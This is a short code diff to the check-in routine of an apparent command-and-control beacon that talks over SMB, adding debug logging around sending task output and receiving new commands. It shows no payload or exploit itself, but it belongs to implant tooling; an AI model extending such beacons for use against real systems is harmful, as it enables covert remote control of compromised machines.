@@ -23,10 +23,18 @@ void BeaconSmb::checkIn()
 	std::string output;
 	taskResultsToCmd(output);
 
+	DEBUG("sending output.size " << std::to_string(output.size()));
+
 	m_clientSmb->sendData(output);
+
+	DEBUG("sent");
+
+	DEBUG("receiving");
 
 	string input;
 	m_clientSmb->receiveData(input);
+
+	DEBUG("received input.size " << std::to_string(input.size()));
 
 	if(!input.empty())
 	{
